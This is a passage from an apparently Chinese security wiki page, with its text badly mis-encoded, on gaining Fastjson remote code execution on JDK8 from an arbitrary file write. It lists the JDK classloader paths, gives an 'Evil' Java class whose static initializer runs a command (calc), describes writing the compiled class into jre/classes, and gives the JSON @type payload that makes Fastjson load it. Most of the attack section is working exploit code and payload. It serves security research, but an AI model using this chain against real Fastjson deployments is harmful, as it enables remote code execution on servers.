<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.181</span><span class="token operator">-</span><span class="token number">8.</span>b13<span class="token punctuation">.</span><span class="token number">39.39</span><span class="token punctuation">.</span>amzn1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">0.</span>el7_5<span class="token punctuation">.</span>x86_64<span class="token operator">-</span>debug<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>b12<span class="token operator">-</span><span class="token number">0.</span>el6_10<span class="token punctuation">.</span>x86_64<span class="token operator">-</span>debug<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="class-å†™æ–‡ä»¶å®æˆ˜" tabindex="-1"><a class="header-anchor" href="#class-å†™æ–‡ä»¶å®æˆ˜"><span>class å†™æ–‡ä»¶å®æˆ˜</span></a></h2><blockquote><p><a href="https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/" target="_blank" rel="noopener noreferrer">JDK8 ä»»æ„æ–‡ä»¶å†™åœºæ™¯ä¸‹çš„ Fastjson RCE | å¤§å½©ç¬” threedr3am<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><h3 id="åŸç†-2" tabindex="-1"><a class="header-anchor" href="#åŸç†-2"><span>åŸç†</span></a></h3><p><strong><mark>JDK8 ä¸‹çš„ Bootstrap å’Œ Ext ClassLoader</mark></strong></p><p>æ ¹æ®ç±»çš„åŒäº²å§”æ´¾æ¨¡å‹ï¼Œç±»çš„åŠ è½½é¡ºåºä¼šå…ˆä» Bootstrap ClassLoader çš„åŠ è½½è·¯å¾„ä¸­å°è¯•åŠ è½½ï¼Œå½“æ‰¾ä¸åˆ°è¯¥ç±»æ—¶ï¼Œæ‰ä¼šé€‰æ‹©ä»ä¸‹ä¸€çº§çš„ Ext ClassLoader çš„åŠ è½½è·¯å¾„å¯»æ‰¾ï¼Œä»¥æ­¤ç±»æ¨åˆ°å¼•å‘åŠ è½½çš„ç±»æ‰€åœ¨çš„ç±»åŠ è½½å™¨ä¸ºæ­¢ã€‚</p><p>ç±»åŠ è½½å™¨ä¸­ï¼Œéƒ½ä¼šå­˜åœ¨ç€ä¸å…¶å¯¹åº”çš„ç±»ã€jar æ–‡ä»¶è·¯å¾„ï¼Œé€šè¿‡æ¢ç©¶å…¶è·¯å¾„ï¼ˆmac osx çš„ jdk8u241 å’Œ linux çš„ openjdk8 ç¯å¢ƒï¼‰ï¼Œå¯ä»¥å‘ç°ï¼ŒBootstrap å’Œ Ext ClassLoader å¯¹åº”çš„ç±»ã€jar æ–‡ä»¶ç›®å½•æœ‰ã€‚</p><p>ã€<strong>mac osxã€‘</strong></p><ul><li><strong>Bootstrap ClassLoader(sun.boot.class.path)</strong></li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>resources<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>rt<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>sunrsasign<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>jsse<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>jce<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>charsets<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>jfr<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>classes
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>sun.boot.class.path æ˜¯ä¸€ä¸ªé…ç½®å˜é‡ï¼Œé€šè¿‡æ‰§è¡Œ</p><p>â€‹<code>System.getProperty(&quot;sun.boot.class.path&quot;)</code>â€‹</p><p>å¯ä»¥è·å–åˆ°ä»¥ä¸Šè·¯å¾„åˆ—è¡¨ï¼Œè¯¥åˆ—è¡¨å³ä¸º Bootstrap ClassLoader åŠ è½½ç±»æ—¶ï¼Œæ–‡ä»¶çš„è¯»å–è·¯å¾„ã€‚</p><ul><li><strong>Ext ClassLoader(java.ext.dirs)</strong></li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>sunec<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>nashorn<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>cldrdata<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>jfxrt<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>dnsns<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>localedata<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>sunjce_provider<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>sunpkcs11<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>jaccess<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>zipfs<span class="token punctuation">.</span>jar
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>ã€linux openjdk8ã€‘</strong></p><ul><li><strong>Bootstrap ClassLoader(sun.boot.class.path)</strong></li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>resources<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>rt<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>sunrsasign<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>jsse<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>jce<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>charsets<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>jfr<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>classes
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong>Ext ClassLoader(java.ext.dirs)</strong></li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext
<span class="token operator">/</span>usr<span class="token operator">/</span>java<span class="token operator">/</span>packages<span class="token operator">/</span>lib<span class="token operator">/</span>ext
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>ã€èšç„¦äºã€‘</strong></p><p>â€‹<code>/xxxx/jre/classes</code>â€‹ <strong><mark>åŠ è½½ç›®å½•</mark></strong>ã€‚</p><h3 id="å®è·µ" tabindex="-1"><a class="header-anchor" href="#å®è·µ"><span>å®è·µ</span></a></h3><p>ç¯å¢ƒæ­å»ºï¼ŒåŒä¸Šè¿°çš„ fatjar ç¯å¢ƒã€‚</p><p><strong>ã€ç¼–å†™ Evil ç±»ã€‘</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token doc-comment comment">/**
 * <span class="token keyword">@author</span> threedr3am
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token keyword">implements</span> <span class="token class-name">AutoCloseable</span> <span class="token punctuation">{</span>

    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token comment">// Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>ã€<strong>ç¼–è¯‘ã€‘</strong></p><p>â€‹<code>javac .\Evil.java</code>â€‹</p><p>ã€<strong>å†™å…¥ã€‘</strong></p><p>åˆ©ç”¨å†™æ–‡ä»¶çš„ gadget å°†ç”Ÿæˆçš„ <code>.class</code>â€‹ æ–‡ä»¶å†™å…¥åˆ° <code>jre/classes</code>â€‹ ç›®å½•ä¸‹ã€‚ï¼ˆ<strong><mark>classes ç›®å½•ä¸å­˜åœ¨å°±åˆ›å»ºä¸€ä¸ªï¼Œç”±äºç±»åŠ è½½æœºåˆ¶çš„è·¯å¾„ï¼Œè¯·åŠ¡å¿…å†™å¯¹ç›®å½•åã€‚å¹¶åœ¨è¯¥ç›®å½•ä¸‹å†™å…¥æ¶æ„ .class å­—èŠ‚ç æ–‡ä»¶</mark></strong>ï¼‰</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429135115-rjkqxsh.92707f76.png" alt="image" loading="lazy">â€‹</p><p><strong>åŒæ ·ä¹Ÿæ˜¯åªèƒ½åŠ è½½è§¦å‘ä¸€æ¬¡ã€‚</strong></p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Evil&quot;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429135227-l4utba2.087d59b2.png" alt="image" loading="lazy">â€‹</p><p>ã€<strong>ç›¸å¯¹äº charsets.jar æ–‡ä»¶ï¼Œå…·æœ‰ä¸¤ä¸ªä¼˜ç‚¹ã€‘</strong></p><ol><li>ä¸Šä¼ çš„æ–‡ä»¶æ›´å°</li><li>ä¸éœ€è¦çŸ¥é“ç›®æ ‡ jdk ç‰ˆæœ¬ï¼ˆç›´æ¥ç¼–è¯‘ä¸€ä¸ªä½ç‰ˆæœ¬çš„æ¶æ„ classï¼‰ï¼Œä¸ä¼šå¯¹ä¸šåŠ¡æ­£å¸¸è¿è¡Œå¸¦æ¥éšæ‚£</li><li>ä¹Ÿä¸éœ€è¦ç¡®è®¤æ‡’åŠ è½½çš„ jar åŒ…ï¼Œ<mark>ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ç›®æ ‡ä¹Ÿå¯èƒ½ä¸å­˜åœ¨ classes ç›®å½•ï¼Œè¿™æ ·ç›®å½•ä¸å­˜åœ¨ä¹Ÿä¼šå¯¼è‡´å†™å…¥å¤±è´¥</mark></li></ol><h3 id="æ€»ç»“" tabindex="-1"><a class="header-anchor" href="#æ€»ç»“"><span>æ€»ç»“</span></a></h3><p>å…¶å® Fastjson è§¦å‘åŠ è½½åˆå§‹åŒ– class çš„æ–¹æ³•å¯èƒ½è¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œé‡ç‚¹æƒ³è¦è¡¨è¾¾çš„æ˜¯ï¼Œ<strong><mark>å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„ class åˆ° jre/classes ç›®å½•ï¼Œå®ç°æ›´ä¼˜çš„â€œä»æ–‡ä»¶ä¸Šä¼ åˆ° Fastjson RCEâ€ã€‚</mark></strong> å¯æƒœçš„æ˜¯ï¼Œjdk11 ä¸­ ClassLoader å·²ç»è¢«å¤§å¹…æ”¹åŠ¨äº†ï¼Œå°±è¿æœ€æ–°ç‰ˆæœ¬çš„ Fastjson éƒ½é»˜è®¤å¼€å¯ safe mode äº†ã€‚</p><h2 id="å‰äººæ ½æ ‘" tabindex="-1"><a class="header-anchor" href="#å‰äººæ ½æ ‘"><span>å‰äººæ ½æ ‘</span></a></h2><ul><li><a href="https://y4er.com/posts/fastjson-bypass-autotype-1268/" target="_blank" rel="noopener noreferrer">fastjson 1.2.68 bypass autotype - Y4er çš„åšå®¢<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://github.com/Y4er/fastjson-bypass-autotype-1.2.68" target="_blank" rel="noopener noreferrer">Y4er/fastjson-bypass-autotype-1.2.68<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 